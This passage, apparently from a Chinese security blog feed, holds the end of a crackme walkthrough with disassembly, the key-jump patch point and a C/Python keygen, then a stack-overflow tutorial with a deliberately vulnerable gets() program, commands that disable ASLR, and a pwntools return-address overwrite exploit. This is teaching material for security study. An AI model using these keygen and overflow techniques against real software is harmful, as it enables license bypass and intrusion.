ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;]   ;  MSVBVM50.__vbaStrMove</span><br><span class="line">00402450   .  8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0]</span><br><span class="line">00402456   .  50            push eax                                       ;  &#x2F;&#x2F; 585235</span><br><span class="line">00402457   .  57            push edi                                       ;  &#x2F;&#x2F; 0091B51C</span><br><span class="line">00402458   .  FF93 A4000000 call dword ptr ds:[ebx+0xA4]</span><br><span class="line">0040245E   .  85C0          test eax,eax                                   ;  &#x2F;&#x2F; &#x3D;&#x3D;0</span><br><span class="line">00402460   .  7D 12         jge short 00402474</span><br><span class="line">00402462   .  68 A4000000   push 0xA4</span><br><span class="line">00402467   .  68 5C1B4000   push 00401B5C</span><br><span class="line">0040246C   .  57            push edi</span><br><span class="line">0040246D   .  50            push eax</span><br><span class="line">0040246E   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">00402474   &gt;  8D45 E0       lea eax,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402477   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">0040247A   .  50            push eax</span><br><span class="line">0040247B   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">0040247E   .  51            push ecx</span><br><span class="line">0040247F   .  52            push edx</span><br><span class="line">00402480   .  6A 03         push 0x3</span><br><span class="line">00402482   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeStrList&gt;;  MSVBVM50.__vbaFreeStrList</span><br><span class="line">00402488   .  83C4 10       add esp,0x10</span><br><span class="line">0040248B   .  8D45 D4       lea eax,dword ptr ss:[ebp-0x2C]</span><br><span class="line">0040248E   .  8D4D D8       lea ecx,dword ptr ss:[ebp-0x28]</span><br><span class="line">00402491   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]</span><br><span class="line">00402494   .  50            push eax</span><br><span class="line">00402495   .  51            push ecx</span><br><span class="line">00402496   .  52            push edx</span><br><span class="line">00402497   .  6A 03         push 0x3</span><br><span class="line">00402499   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeObjList&gt;;  MSVBVM50.__vbaFreeObjList</span><br><span class="line">0040249F   .  8B06          mov eax,dword ptr ds:[esi]</span><br><span class="line">004024A1   .  83C4 10       add esp,0x10</span><br><span class="line">004024A4   .  56            push esi</span><br><span class="line">004024A5   .  FF90 04030000 call dword ptr ds:[eax+0x304]</span><br><span class="line">004024AB   .  8B1D 0C414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSet&gt;] ;  MSVBVM50.__vbaObjSet</span><br><span class="line">004024B1   .  50            push eax</span><br><span class="line">004024B2   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">004024B5   .  50            push eax</span><br><span class="line">004024B6   .  FFD3          call ebx                                       ;  &lt;&amp;MSVBVM50.__vbaObjSet&gt;</span><br><span class="line">004024B8   .  8BF8          mov edi,eax</span><br><span class="line">004024BA   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004024BD   .  52            push edx</span><br><span class="line">004024BE   .  57            push edi</span><br><span class="line">004024BF   .  8B0F          mov ecx,dword ptr ds:[edi]</span><br><span class="line">004024C1   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</span><br><span class="line">004024C7   .  85C0          test eax,eax                                   ;  eax&#x3D;0,zf&#x3D;1</span><br><span class="line">004024C9   .  7D 12         jge short 004024DD</span><br><span class="line">004024CB   .  68 A0000000   push 0xA0</span><br><span class="line">004024D0   .  68 5C1B4000   push 00401B5C</span><br><span class="line">004024D5   .  57            push edi</span><br><span class="line">004024D6   .  50            push eax</span><br><span class="line">004024D7   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">004024DD   &gt;  56            push esi</span><br><span class="line">004024DE   .  FF95 40FFFFFF call dword ptr ss:[ebp-0xC0]</span><br><span class="line">004024E4   .  50            push eax</span><br><span class="line">004024E5   .  8D45 D8       lea eax,dword ptr ss:[ebp-0x28]</span><br><span class="line">004024E8   .  50            push eax</span><br><span class="line">004024E9   .  FFD3          call ebx</span><br><span class="line">004024EB   .  8BF0          mov esi,eax</span><br><span class="line">004024ED   .  8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">004024F0   .  52            push edx</span><br><span class="line">004024F1   .  56            push esi</span><br><span class="line">004024F2   .  8B0E          mov ecx,dword ptr ds:[esi]</span><br><span class="line">004024F4   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</span><br><span class="line">004024FA   .  85C0          test eax,eax                                   ;  eax&#x3D;0</span><br><span class="line">004024FC   .  7D 12         jge short 00402510</span><br><span class="line">004024FE   .  68 A0000000   push 0xA0</span><br><span class="line">00402503   .  68 5C1B4000   push 00401B5C</span><br><span class="line">00402508   .  56            push esi</span><br><span class="line">00402509   .  50            push eax</span><br><span class="line">0040250A   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">00402510   &gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]                ;  eax&#x3D;3334444</span><br><span class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]                ;  ecx&#x3D;585235</span><br><span class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCat&gt;] ;  MSVBVM50.__vbaStrCat</span><br><span class="line">0040251C   .  50            push eax                                       ;  eax&#x3D;3334444</span><br><span class="line">0040251D   .  68 701B4000   push 00401B70                                  ;  UNICODE &quot;AKA-&quot;</span><br><span class="line">00402522   .  51            push ecx                                       ;  ecx&#x3D;585235</span><br><span class="line">00402523   .  FFD7          call edi                                       ;  &lt;&amp;MSVBVM50.__vbaStrCat&gt;</span><br><span class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;&gt;;  MSVBVM50.__vbaStrMove</span><br><span class="line">0040252B   .  8BD0          mov edx,eax                                    ;  edx&#x3D;eax&#x3D;AKA-585235</span><br><span class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402530   .  FFD3          call ebx                                       ;  &lt;&amp;MSVBVM50.__vbaStrMove&gt;</span><br><span class="line">00402532   .  50            push eax</span><br><span class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;]    ;  MSVBVM50.__vbaStrCmp</span><br><span class="line">00402539   .  8BF0          mov esi,eax                                    ;  eax&#x3D;-1</span><br><span class="line">0040253B   .  8D55 E0       lea edx,dword ptr ss:[ebp-0x20]</span><br><span class="line">0040253E   .  F7DE          neg esi                                        ;  取补</span><br><span class="line">00402540   .  8D45 E8       lea eax,dword ptr ss:[ebp-0x18]</span><br><span class="line">00402543   .  52            push edx</span><br><span class="line">00402544   .  1BF6          sbb esi,esi</span><br><span class="line">00402546   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00402549   .  50            push eax</span><br><span class="line">0040254A   .  46            inc esi</span><br><span class="line">0040254B   .  51            push ecx</span><br><span class="line">0040254C   .  6A 03         push 0x3</span><br><span class="line">0040254E   .  F7DE          neg esi</span><br><span class="line">00402550   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeStrList&gt;;  MSVBVM50.__vbaFreeStrList</span><br><span class="line">00402556   .  83C4 10       add esp,0x10</span><br><span class="line">00402559   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]</span><br><span class="line">0040255C   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">0040255F   .  52            push edx</span><br><span class="line">00402560   .  50            push eax</span><br><span class="line">00402561   .  6A 02         push 0x2</span><br><span class="line">00402563   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeObjList&gt;;  MSVBVM50.__vbaFreeObjList</span><br><span class="line">00402569   .  83C4 0C       add esp,0xC</span><br><span class="line">0040256C   .  B9 04000280   mov ecx,0x80020004</span><br><span class="line">00402571   .  B8 0A000000   mov eax,0xA</span><br><span class="line">00402576   .  894D 9C       mov dword ptr ss:[ebp-0x64],ecx</span><br><span class="line">00402579   .  66:85F6       test si,si                                     ;  esi&#x3D;0,ZF&#x3D;1</span><br><span class="line">0040257C   .  8945 94       mov dword ptr ss:[ebp-0x6C],eax</span><br><span class="line">0040257F   .  894D AC       mov dword ptr ss:[ebp-0x54],ecx</span><br><span class="line">00402582   .  8945 A4       mov dword ptr ss:[ebp-0x5C],eax</span><br><span class="line">00402585   .  894D BC       mov dword ptr ss:[ebp-0x44],ecx</span><br><span class="line">00402588   .  8945 B4       mov dword ptr ss:[ebp-0x4C],eax</span><br><span class="line">0040258B      74 58         je short 004025E5                              ;  &#x2F;&#x2F; 爆破关键跳，NOP</span><br><span class="line">0040258D   .  68 801B4000   push 00401B80                                  ;  UNICODE &quot;You Get It&quot;</span><br><span class="line">00402592   .  68 9C1B4000   push 00401B9C                                  ;  ASCII &quot;\r&quot;</span><br><span class="line">00402597   .  FFD7          call edi</span><br></pre></td></tr></table></figure>

<p>其实代码很简单，经过一遍跟踪，基本都出来了，重点分析部分如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00402412   .  50            push eax                                       ;  &#x2F;&#x2F;eax&#x3D;111222,name</span><br><span class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]</span><br><span class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;]   ;  MSVBVM50.__vbaLenBstr</span><br><span class="line">0040241B   .  8BF8          mov edi,eax                                    ;  edi&#x3D;6</span><br><span class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]                ;  ecx&#x3D;1111222地址</span><br><span class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                           ;  &#x2F;&#x2F; 乘法,edi*0x17CFB</span><br><span class="line">00402426   .  51            push ecx</span><br><span class="line">00402427   .  0F80 91020000 jo 004026BE</span><br><span class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;]           ;  MSVBVM50.rtcAnsiValueBstr</span><br><span class="line">00402433   .  0FBFD0        movsx edx,ax</span><br><span class="line">00402436   .  03FA          add edi,edx                                    ;  &#x2F;&#x2F; edi&#x3D;edi+edx（0x31）</span><br><span class="line">00402438   .  0F80 80020000 jo 004026BE</span><br><span class="line">0040243E   .  57            push edi</span><br><span class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;]     ;  MSVBVM50.__vbaStrI4</span><br><span class="line">00402445   .  8BD0          mov edx,eax                                    ;  &#x2F;&#x2F; eax&#x3D;585235</span><br></pre></td></tr></table></figure>

<p>首先，eax为Name的地址，经过<strong>vbaLenBstr计算的长度赋值给edi,然后edi=edi*0x17CFB,接着edi=edi+edx,而edx为Name字符串第一个字符Ansi的值，最后进过</strong>vbaStrI4将edi的整数值转换为十进制字符串585235。</p>
<p>然后向下跟踪和字符串585235相关的东西：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00402510   &gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]                ;  eax&#x3D;3334444</span><br><span class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]                ;  ecx&#x3D;585235</span><br><span class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCat&gt;] ;  MSVBVM50.__vbaStrCat</span><br><span class="line">0040251C   .  50            push eax                                       ;  eax&#x3D;3334444</span><br><span class="line">0040251D   .  68 701B4000   push 00401B70                                  ;  UNICODE &quot;AKA-&quot;</span><br><span class="line">00402522   .  51            push ecx                                       ;  ecx&#x3D;585235</span><br><span class="line">00402523   .  FFD7          call edi                                       ;  &lt;&amp;MSVBVM50.__vbaStrCat&gt;</span><br><span class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;&gt;;  MSVBVM50.__vbaStrMove</span><br><span class="line">0040252B   .  8BD0          mov edx,eax                                    ;  edx&#x3D;eax&#x3D;AKA-585235</span><br><span class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402530   .  FFD3          call ebx                                       ;  &lt;&amp;MSVBVM50.__vbaStrMove&gt;</span><br><span class="line">00402532   .  50            push eax</span><br><span class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;]    ;  MSVBVM50.__vbaStrCmp</span><br><span class="line">00402539   .  8BF0          mov esi,eax                    </span><br></pre></td></tr></table></figure>

<p>这段代码中将585235通过<strong>vbaStrCat与”AKA-”连接到一起组成字符串”AKA-585235”,然后通过</strong>vbaStrCmp函数与我们的Serial比较结果，最后返回值放到eax中，通过返回值确定是否正确。将这里的分析与上一块合到一起，很容易就可以得出最终的注册码。</p>
<blockquote>
<p>小结一下：先取出注册码的长度len, 然后取出注册码第一个字符的ANSI值cName, 让后计算len*0x17CFB+cName,将计算的值转换为10进制文本，前面加上”AKA-”组成最后的注册码。</p>
</blockquote>
<p>C/CPP代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CrackMe160.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">// 002</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;iostream&quot;</span></span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;160CrackMe-002 Name/Serial\r\n\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">    gets_s(buff,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">int</span> nLen = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">if</span> ( nLen &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> nRet = nLen * <span class="number">0x17CFB</span>;</span><br><span class="line">        nRet += buff[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AKA-%d\r\n&quot;</span>,nRet);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Input error!\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Python：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  author ol4three</span><br><span class="line">i   &#x3D;   str(input())</span><br><span class="line">i_len &#x3D; len(str(i))</span><br><span class="line">print i_len</span><br><span class="line">i_len &#x3D; i_len * 0x17CFb</span><br><span class="line">flag &#x3D; ord(i[0]) + i_len</span><br><span class="line">print &quot;AKA-&quot; + str(flag)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>crackme</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-stack-Overflow-1</title>
    <url>/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/linux-stack-Overflow-1/</url>
    <content><![CDATA[<h1 id="栈介绍"><a href="#栈介绍" class="headerlink" title="栈介绍"></a>栈介绍</h1><h3 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h3><blockquote>
<p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p>
</blockquote>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/Data_stack.png" alt="基本栈操作"></p>
<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
<a id="more"></a>

<h3 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><p>这里再给出另外一张寄存器的图</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/register.png" alt="img"></p>
<p>需要注意的是，32 位和 64 位程序有以下简单的区别</p>
<ul>
<li>x86<ul>
<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
</ul>
</li>
<li>x64<ul>
<li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li>
</ul>
</li>
</ul>
<h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote>
<p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
<ul>
<li>程序必须向栈上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
</blockquote>
<h3 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h3><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">  char s[12];</span><br><span class="line">  gets(s);</span><br><span class="line">  puts(s);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
<p>我们利用如下命令对其进行编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example </span><br><span class="line">stack_example.c: In function ‘vulnerable’:</span><br><span class="line">stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^</span><br><span class="line">&#x2F;tmp&#x2F;ccPU8rRA.o：在函数‘vulnerable’中：</span><br><span class="line">stack_example.c:(.text+0x27): 警告： the &#96;gets&#39; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>

<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p>
<blockquote>
<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
</blockquote>
<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">		checksec stack_example</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;stack_example&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p>
<ul>
<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
</ul>
<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int vulnerable()</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  return puts(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>

<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x08048456。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048456 success         db 55h</span><br><span class="line">.text:08048457 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048457                 mov     ebp, esp</span><br><span class="line">.text:08048459                 push    ebx</span><br><span class="line">.text:0804845A                 sub     esp, 4</span><br><span class="line">.text:0804845D                 call    near ptr __x86_get_pc_thunk_ax</span><br><span class="line">.text:08048462                 add     eax, 1B9Eh</span><br><span class="line">.text:08048467                 sub     esp, 0Ch</span><br><span class="line">.text:0804846A                 push    20697421h       ; s</span><br><span class="line">.text:0804846F                 mov     ebx, eax</span><br><span class="line">.text:08048471                 call    _puts</span><br><span class="line">.text:08048476                 add     esp, 10h</span><br><span class="line">.text:08048479                 nop</span><br><span class="line">.text:0804847A                 mov     ebx, [ebp-4]</span><br><span class="line">.text:0804847D                 leave</span><br><span class="line">.text:0804847E                 retn</span><br><span class="line">.text:0804847E ; &#125; &#x2F;&#x2F; starts at 8048456</span><br></pre></td></tr></table></figure>

<p>那么如果我们读取的字符串为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x14*&#39;a&#39;+&#39;bbbb&#39;+success_addr</span><br></pre></td></tr></table></figure>

<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x0804843B   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>

<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x08048456 在内存中的形式是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x56\x84\x04\x08</span><br></pre></td></tr></table></figure>

<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x56 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##coding&#x3D;utf8</span><br><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;stack_example&#39;)</span><br><span class="line">success_addr &#x3D; 0x08048456</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x14 + &#39;bbbb&#39; + p32(success_addr)</span><br><span class="line">print p32(success_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>执行一波代码，可以得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python exp.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;stack_example&#39;: pid 61936</span><br><span class="line">;\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process &#39;.&#x2F;stack_example&#39; stopped with exit code -11 (SIGSEGV) (pid 61936)</span><br><span class="line">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>

<p>可以看到我们确实已经执行 success 函数。</p>
<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p>
<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略’\x00’</li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到’\x00’停止</li>
<li>strcat，字符串拼接，遇到’\x00’停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
<ul>
<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
<li>直接地址索引，就相当于直接给定了地址。</li>
</ul>
<p>一般来说，我们会有如下的覆盖需求</p>
<ul>
<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
</ul>
<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
